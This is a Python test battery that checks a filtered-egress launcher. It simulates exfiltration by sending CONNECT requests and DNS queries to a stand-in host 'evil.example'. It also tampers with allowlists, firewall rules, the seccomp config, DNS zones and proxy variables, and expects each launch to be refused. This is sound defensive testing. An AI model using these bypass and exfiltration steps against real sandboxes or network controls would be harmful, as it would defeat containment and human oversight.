"""S7 closure battery: filtered-egress launcher (F136 productization).

Break-first, hermetic, $0: the wall is the localhost fixture in
gov/egress_launcher.py (stub CONNECT proxy + stub confined DNS +
FakePacketFilter), NOT the real netns/nftables topology — the GCP lab
(evals/FINDINGS.md F81, 17 STOPPED / 0 BREAK) proved the topology; this
battery proves the PRODUCT layer: the launcher refuses when the wall
cannot be verified, refuses on component tamper, and lets allowlisted
traffic through.

Verdicts: CLOSED (gap unreachable) / BREAK (gap reachable — investigate)
/ CONTROL (positive control must keep holding) / ERROR (probe problem).

Run: TMPDIR=/tmp/gov-run-s7 ~/workspace/.gov-venv/bin/python evals/s7egress_break.py
"""

import fcntl
import json
import os
import sys
import tempfile

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
for _p in (REPO_ROOT, os.path.join(REPO_ROOT, "tests")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from gov.egress_launcher import (  # noqa: E402
    EgressLaunchRefused,
    FilteredEgressLauncher,
    FlappingWallProvider,
    SimulatedWallFixture,
    SimulatedWallProvider,
    WallComponentInventory,
    install_simulated_wall,
    repin_after_fixture_fixup,
)


def _tmpdir():
    base = os.environ.get("TMPDIR", "/tmp")
    return tempfile.mkdtemp(prefix="s7egress-", dir=base)


def _fresh_wall_up():
    """Fresh sim dir + installed wall + running fixture + re-pinned
    manifest. Returns (sim, fixture, inventory, events, launcher)."""
    tmp = _tmpdir()
    sim = os.path.join(tmp, "wall")
    install_simulated_wall(sim, wall_id="s7probe")
    events = []
    fix = SimulatedWallFixture(sim)
    fix.__enter__()
    inv = repin_after_fixture_fixup(sim)
    fix.inventory = inv
    launcher = FilteredEgressLauncher(
        manifest_path=os.path.join(sim, "wall_pins.json"),
        receipt_path=os.path.join(sim, "wall_receipt.json"),
        wall_provider=fix.provider(), audit=events.append,
        trust=inv.trust)
    return sim, fix, inv, events, launcher


def _refusals(events, reason_part):
    return [e for e in events
            if e.get("event") == "egress_wall_launch_refused"
            and reason_part in str(e.get("reason", ""))]


CHILD_CONNECT = (
    "import os, socket, sys\n"
    "proxy = os.environ['EGRESS_PROXY_ADDR']\n"
    "host, _, port = proxy.rpartition(':')\n"
    "target = sys.argv[1]\n"
    "s = socket.create_connection((host, int(port)), timeout=5)\n"
    "s.sendall(b'CONNECT ' + target.encode() + b' HTTP/1.1\\r\\n"
    "Host: ' + target.encode() + b'\\r\\n\\r\\n')\n"
    "resp = s.recv(1024)\n"
    "print('STATUS:' + resp.split(b'\\r\\n', 1)[0].decode('ascii', 'replace'))\n"
)


# ---------------------------------------------------------------------------
# Probes
# ---------------------------------------------------------------------------

def probe_exfil_via_proxy_blocked():
    """Exfil CONNECT to a non-allowlisted host through the launcher's
    proxy must be refused (403) and DENY-logged; the IP-layer model must
    drop the direct tuple too."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        cp = launcher.run_child(
            [sys.executable, "-c", CHILD_CONNECT, "evil.example:443"],
            capture_output=True, text=True)
        status = [l for l in cp.stdout.splitlines()
                  if l.startswith("STATUS:")]
        deny_log = os.path.join(sim, "proxy_deny.log")
        logged = (os.path.exists(deny_log)
                  and "DENY-CONNECT evil.example:443"
                  in open(deny_log).read())
        filt = fix.packet_filter()
        modeled_drop = filt.would_drop("127.0.0.1", 9999)
        if (status and "403" in status[0] and logged and modeled_drop):
            return ("CLOSED", "proxy 403 + DENY-CONNECT logged; "
                    "filter model drops direct tuple")
        return ("BREAK", "status=%r logged=%r modeled_drop=%r"
                % (status, logged, modeled_drop))
    finally:
        fix.__exit__()


def probe_exfil_dns_tunnel_no_answer():
    """Confined DNS must give no answer for non-allowlisted names (the
    no-answer-means-no-connect invariant the lab's A5 fix established)."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        from gov.egress_launcher import dns_query
        import json as _j
        eps = _j.load(open(os.path.join(sim, "endpoints.json")))
        dns_host, dns_port = eps["dns"]
        evil = dns_query(dns_host, dns_port, "evil.example")
        legit = dns_query(dns_host, dns_port, "example.com")
        if evil is None and legit == "127.0.0.1":
            return ("CLOSED", "evil.example -> NXDOMAIN; "
                    "example.com -> 127.0.0.1")
        return ("BREAK", "evil=%r legit=%r" % (evil, legit))
    finally:
        fix.__exit__()


def probe_wall_down_refused():
    """No fixture ever started: wall DOWN -> launch refuses and the
    child never spawns (sentinel absent)."""
    tmp = _tmpdir()
    sim = os.path.join(tmp, "wall")
    inv, paths = install_simulated_wall(sim, wall_id="s7down")
    events = []
    launcher = FilteredEgressLauncher(
        manifest_path=paths["manifest"], receipt_path=paths["receipt"],
        wall_provider=SimulatedWallProvider(sim, inv),
        audit=events.append, trust=inv.trust)
    sentinel = os.path.join(tmp, "sentinel")
    try:
        launcher.run_child(
            [sys.executable, "-c",
             "open(%r, 'w').write('ran')" % sentinel],
            capture_output=True)
        return ("BREAK", "launch succeeded with the wall down")
    except EgressLaunchRefused as e:
        if "wall_not_up" in str(e) and not os.path.exists(sentinel) \
                and _refusals(events, "wall_not_up"):
            return ("CLOSED", "refused wall_not_up; child never spawned")
        return ("BREAK", "wrong refusal: %s sentinel=%r"
                % (e, os.path.exists(sentinel)))
    except Exception as e:  # noqa: BLE001
        return ("ERROR", "unexpected: %r" % e)


def probe_partial_wall_refused():
    """Proxy up, DNS dead: DEGRADED is still a refusal (fail-closed,
    never degraded)."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        fix.dns.stop()  # DNS dead; proxy still up -> partial wall
        import json as _j
        epp = os.path.join(sim, "endpoints.json")
        eps = _j.load(open(epp))
        del eps["dns"]
        _j.dump(eps, open(epp, "w"))
        try:
            launcher.run_child([sys.executable, "-c", "pass"],
                               capture_output=True)
            return ("BREAK", "launch succeeded on a partial wall")
        except EgressLaunchRefused as e:
            if "wall_degraded" in str(e) \
                    and _refusals(events, "wall_degraded"):
                return ("CLOSED", "partial wall -> wall_degraded refusal")
            return ("BREAK", "wrong refusal: %s" % e)
    finally:
        fix.__exit__()


def _tamper_probe(name, mutate, expect_part):
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        mutate(sim)
        try:
            launcher.run_child([sys.executable, "-c", "pass"],
                               capture_output=True)
            return ("BREAK", "%s: launch succeeded after tamper" % name)
        except EgressLaunchRefused as e:
            if expect_part in str(e):
                return ("CLOSED", ("%s: %s" % (name, e)).split(":")[0]
                        + ": " + str(e)[:90])
            return ("BREAK", "%s: wrong refusal: %s" % (name, e))
    finally:
        fix.__exit__()


def probe_tamper_ruleset_pinned():
    """nft ruleset edited in place (attacker adds an ALLOW)."""
    def mutate(sim):
        p = os.path.join(sim, "conf", "agent0.nft.sim")
        with open(p, "a", encoding="utf-8") as f:
            f.write("ALLOW tcp wall:evil   # attacker\n")
    return _tamper_probe("pinned-ruleset edit", mutate,
                         "component_tampered")


def probe_tamper_ruleset_running():
    """Running ruleset drifted while the pinned copy is intact: the
    launcher's check() must catch live-wall drift (DEGRADED)."""
    def mutate(sim):
        p = os.path.join(sim, "run", "nft_state.txt")
        with open(p, "a", encoding="utf-8") as f:
            f.write("ALLOW tcp wall:evil   # live drift\n")
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        mutate(sim)
        try:
            launcher.run_child([sys.executable, "-c", "pass"],
                               capture_output=True)
            return ("BREAK", "launch succeeded with drifted live ruleset")
        except EgressLaunchRefused as e:
            if "wall_degraded" in str(e) \
                    and "running_ruleset_drift" in str(e):
                return ("CLOSED", "live drift -> wall_degraded refusal")
            return ("BREAK", "wrong refusal: %s" % e)
    finally:
        fix.__exit__()


def probe_tamper_allowlist_symlink_swap():
    """Allowlist file replaced by a symlink to attacker content."""
    def mutate(sim):
        p = os.path.join(sim, "conf", "allowlist.txt")
        evil = os.path.join(sim, "evil_allow.txt")
        with open(evil, "w", encoding="utf-8") as f:
            f.write("evil.example:443\n")
        os.remove(p)
        os.symlink(evil, p)
    return _tamper_probe("allowlist symlink swap", mutate,
                         "component_tampered")


def probe_tamper_dns_zone():
    """DNS zone byte-flip (rebind example.com elsewhere)."""
    def mutate(sim):
        p = os.path.join(sim, "conf", "dns_hosts.txt")
        data = open(p, encoding="utf-8").read()
        open(p, "w", encoding="utf-8").write(
            data.replace("127.0.0.1", "127.0.0.2"))
    return _tamper_probe("dns zone flip", mutate, "component_tampered")


def probe_tamper_manifest():
    """Manifest hex-char flip: the receipt must catch it."""
    def mutate(sim):
        p = os.path.join(sim, "wall_pins.json")
        data = open(p, encoding="utf-8").read()
        idx = data.index('"sha256": "') + len('"sha256": "')
        flip = "0" if data[idx] != "0" else "1"
        open(p, "w", encoding="utf-8").write(
            data[:idx] + flip + data[idx + 1:])
    return _tamper_probe("manifest edit", mutate, "receipt_unverifiable")


def probe_tamper_receipt_missing():
    """Receipt deleted: no trust anchor -> no launch."""
    def mutate(sim):
        os.remove(os.path.join(sim, "wall_receipt.json"))
    return _tamper_probe("receipt deletion", mutate,
                         "receipt_unverifiable")


def probe_tamper_receipt_corrupt():
    """Receipt bytes flipped (not deleted): still no launch."""
    def mutate(sim):
        p = os.path.join(sim, "wall_receipt.json")
        data = open(p, encoding="utf-8").read()
        idx = data.index('"manifest_sha256": "') \
            + len('"manifest_sha256": "')
        flip = "0" if data[idx] != "0" else "1"
        open(p, "w", encoding="utf-8").write(
            data[:idx] + flip + data[idx + 1:])
    return _tamper_probe("receipt corruption", mutate,
                         "receipt_unverifiable")


def probe_tamper_seccomp_config():
    """seccomp policy descriptor edited (weaken the blocked-call set)."""
    def mutate(sim):
        p = os.path.join(sim, "conf", "seccomp_config.txt")
        data = open(p, encoding="utf-8").read()
        open(p, "w", encoding="utf-8").write(
            data.replace("unshare(CLONE_NEWNET)", ""))
    return _tamper_probe("seccomp config edit", mutate,
                         "component_tampered")


def probe_tamper_proxy_impl():
    """Proxy enforcement-policy descriptor edited."""
    def mutate(sim):
        p = os.path.join(sim, "conf", "proxy_impl.txt")
        data = open(p, encoding="utf-8").read()
        open(p, "w", encoding="utf-8").write(
            data.replace("default=deny-with-log",
                         "default=allow-with-log"))
    return _tamper_probe("proxy impl edit", mutate, "component_tampered")


def probe_tamper_allowlist_append_evil():
    """The classic widen-the-world: append evil.example to the
    allowlist. Digest pinning must refuse; the proxy must never see
    the widened world."""
    def mutate(sim):
        p = os.path.join(sim, "conf", "allowlist.txt")
        with open(p, "a", encoding="utf-8") as f:
            f.write("evil.example:443\n")
    return _tamper_probe("allowlist widen", mutate, "component_tampered")


def probe_nft_state_deleted():
    """Running-ruleset file deleted outright -> wall DOWN, no launch."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        os.remove(os.path.join(sim, "run", "nft_state.txt"))
        try:
            launcher.run_child([sys.executable, "-c", "pass"],
                               capture_output=True)
            return ("BREAK", "launched with no running ruleset")
        except EgressLaunchRefused as e:
            if "wall_not_up" in str(e):
                return ("CLOSED", "missing live ruleset -> wall_not_up")
            return ("BREAK", "wrong refusal: %s" % e)
    finally:
        fix.__exit__()


def probe_tamper_then_restore_recovers():
    """CONTROL: tamper -> refusal; restore original bytes -> launch
    works again. The launcher must not latch into a bricked state."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        p = os.path.join(sim, "conf", "allowlist.txt")
        original = open(p, encoding="utf-8").read()
        with open(p, "a", encoding="utf-8") as f:
            f.write("evil.example:443\n")
        try:
            launcher.run_child([sys.executable, "-c", "pass"],
                               capture_output=True)
            return ("BREAK", "no refusal while tampered")
        except EgressLaunchRefused:
            pass
        with open(p, "w", encoding="utf-8") as f:
            f.write(original)
        cp = launcher.run_child(
            [sys.executable, "-c", "print('back')"],
            capture_output=True, text=True)
        if cp.returncode == 0 and "back" in cp.stdout:
            return ("CONTROL", "restore -> verify passes, launch works")
        return ("BREAK", "restore did not recover: rc=%r" % cp.returncode)
    finally:
        fix.__exit__()


def probe_startup_race_preexec_abort():
    """Wall dies between the parent check and the child preexec: the
    child must abort (exit 99) before exec; nothing ungoverned runs."""
    tmp = _tmpdir()
    sim = os.path.join(tmp, "wall")
    install_simulated_wall(sim, wall_id="s7race")
    events = []
    fix = SimulatedWallFixture(sim)
    fix.__enter__()
    try:
        inv = repin_after_fixture_fixup(sim)
        fix.inventory = inv
        launcher = FilteredEgressLauncher(
            manifest_path=os.path.join(sim, "wall_pins.json"),
            receipt_path=os.path.join(sim, "wall_receipt.json"),
            wall_provider=FlappingWallProvider(sim, inv),
            audit=events.append, trust=inv.trust)
        sentinel = os.path.join(tmp, "sentinel")
        try:
            launcher.run_child(
                [sys.executable, "-c",
                 "open(%r, 'w').write('ran')" % sentinel],
                capture_output=True)
            return ("BREAK", "child exec'd after the wall died mid-launch")
        except EgressLaunchRefused as e:
            if "preexec_recheck_failed" in str(e) \
                    and not os.path.exists(sentinel):
                return ("CLOSED", "preexec re-assert aborted the child; "
                        "sentinel absent")
            return ("BREAK", "wrong outcome: %s sentinel=%r"
                    % (e, os.path.exists(sentinel)))
    finally:
        fix.__exit__()


def probe_allowed_traffic_flows():
    """CONTROL: allowlisted destination through the proxy still works
    (CONNECT -> 200, then origin 200 through the tunnel)."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        import json as _j
        eps = _j.load(open(os.path.join(sim, "endpoints.json")))
        origin_port = eps["origin"][1]
        child = (
            "import os, socket\n"
            "proxy = os.environ['EGRESS_PROXY_ADDR']\n"
            "host, _, port = proxy.rpartition(':')\n"
            "s = socket.create_connection((host, int(port)), timeout=5)\n"
            "s.sendall(b'CONNECT example.com:%d HTTP/1.1\\r\\n\\r\\n')\n"
            "resp = s.recv(1024)\n"
            "assert b'200' in resp.split(b'\\r\\n', 1)[0], resp\n"
            "s.sendall(b'GET / HTTP/1.0\\r\\nHost: example.com\\r\\n\\r\\n')\n"
            "data = b''\n"
            "while True:\n"
            "    chunk = s.recv(4096)\n"
            "    if not chunk: break\n"
            "    data += chunk\n"
            "print('ORIGIN:' + data.decode()[-3:])\n" % origin_port
        )
        cp = launcher.run_child([sys.executable, "-c", child],
                                capture_output=True, text=True)
        if cp.returncode == 0 and "ORIGIN:ok" in cp.stdout.replace(
                "\n", ""):
            return ("CONTROL", "allowlisted CONNECT -> 200, origin 200 ok")
        return ("BREAK", "rc=%r out=%r err=%r"
                % (cp.returncode, cp.stdout, cp.stderr))
    finally:
        fix.__exit__()


def probe_proxy_env_scrubbed():
    """CONTROL: child-controlled proxy env (the F81 Wiki shape) is
    scrubbed; wall markers are injected."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        child = ("import os, json\n"
                 "print(json.dumps({k: os.environ.get(k) for k in "
                 "['NO_PROXY', 'no_proxy', 'http_proxy', 'HTTP_PROXY', "
                 "'EGRESS_WALL_ACTIVE', 'EGRESS_WALL_ID', "
                 "'EGRESS_PROXY_ADDR', 'MYVAR']}))\n")
        cp = launcher.run_child(
            [sys.executable, "-c", child],
            env={"NO_PROXY": "*", "no_proxy": "evil.example",
                 "http_proxy": "http://evil:9/",
                 "HTTP_PROXY": "http://evil:9/", "MYVAR": "keep"},
            capture_output=True, text=True)
        got = json.loads(cp.stdout.strip())
        if (got["NO_PROXY"] is None and got["no_proxy"] is None
                and got["http_proxy"] is None
                and got["HTTP_PROXY"] is None
                and got["EGRESS_WALL_ACTIVE"] == "1"
                and got["EGRESS_WALL_ID"] == "s7probe"
                and got["EGRESS_PROXY_ADDR"]
                and got["MYVAR"] == "keep"):
            return ("CONTROL", "proxy env scrubbed; markers injected; "
                    "caller env preserved")
        return ("BREAK", "child env wrong: %r" % got)
    finally:
        fix.__exit__()


def probe_algo_agility():
    """CONTROL: sha512-only pins verify; a sha256-only verifier refuses
    (no silent downgrade)."""
    tmp = _tmpdir()
    sim = os.path.join(tmp, "wall")
    inv, paths = install_simulated_wall(sim, wall_id="s7algo",
                                        algos=("sha512",))
    try:
        inv.verify()
    except EgressLaunchRefused as e:
        return ("ERROR", "sha512-only install should verify: %s" % e)
    strict = WallComponentInventory(paths["manifest"], paths["receipt"],
                                    supported_algos=("sha256",),
                                    trust=paths["trust"])
    try:
        strict.verify()
        return ("BREAK", "sha256-only verifier accepted sha512-only pins")
    except EgressLaunchRefused as e:
        if "no_common_algorithm" in str(e):
            return ("CONTROL", "negotiated sha512; sha256-only verifier "
                    "refuses loudly")
        return ("ERROR", "wrong refusal: %s" % e)


def probe_lock_held_refused():
    """CONTROL: the verify+spawn lock held elsewhere -> refusal, not an
    unlocked launch (the check->spawn race stays closed)."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        lock_path = os.path.join(sim, "wall_pins.json.lock")
        holder = open(lock_path, "a+b")
        fcntl.flock(holder.fileno(), fcntl.LOCK_EX)
        try:
            try:
                launcher.run_child([sys.executable, "-c", "pass"],
                                   capture_output=True)
                return ("BREAK", "launched without the wall lock")
            except EgressLaunchRefused as e:
                if "lock_unavailable" in str(e):
                    return ("CONTROL", "lock contention -> loud refusal")
                return ("BREAK", "wrong refusal: %s" % e)
        finally:
            fcntl.flock(holder.fileno(), fcntl.LOCK_UN)
            holder.close()
    finally:
        fix.__exit__()


PROBES = [
    ("exfil_via_proxy_blocked", probe_exfil_via_proxy_blocked),
    ("exfil_dns_tunnel_no_answer", probe_exfil_dns_tunnel_no_answer),
    ("wall_down_refused", probe_wall_down_refused),
    ("partial_wall_refused", probe_partial_wall_refused),
    ("tamper_ruleset_pinned", probe_tamper_ruleset_pinned),
    ("tamper_ruleset_running", probe_tamper_ruleset_running),
    ("tamper_allowlist_symlink_swap", probe_tamper_allowlist_symlink_swap),
    ("tamper_dns_zone", probe_tamper_dns_zone),
    ("tamper_manifest", probe_tamper_manifest),
    ("tamper_receipt_missing", probe_tamper_receipt_missing),
    ("tamper_receipt_corrupt", probe_tamper_receipt_corrupt),
    ("tamper_seccomp_config", probe_tamper_seccomp_config),
    ("tamper_proxy_impl", probe_tamper_proxy_impl),
    ("tamper_allowlist_append_evil", probe_tamper_allowlist_append_evil),
    ("nft_state_deleted", probe_nft_state_deleted),
    ("tamper_then_restore_recovers", probe_tamper_then_restore_recovers),
    ("startup_race_preexec_abort", probe_startup_race_preexec_abort),
    ("allowed_traffic_flows", probe_allowed_traffic_flows),
    ("proxy_env_scrubbed", probe_proxy_env_scrubbed),
    ("algo_agility", probe_algo_agility),
    ("lock_held_refused", probe_lock_held_refused),
]


def main():
    bad = 0
    counts = {}
    for name, fn in PROBES:
        try:
            verdict, detail = fn()
        except Exception as e:  # noqa: BLE001 - probe harness
            verdict, detail = "ERROR", "probe raised: %r" % e
        counts[verdict] = counts.get(verdict, 0) + 1
        if verdict in ("BREAK", "ERROR"):
            bad += 1
        print("%-32s %-8s %s" % (name, verdict, detail))
    print("----")
    print("summary: %s" % " ".join("%s=%d" % kv
                                   for kv in sorted(counts.items())))
    print("S7-BATTERY: %s" % ("GREEN" if bad == 0 else "RED"))
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
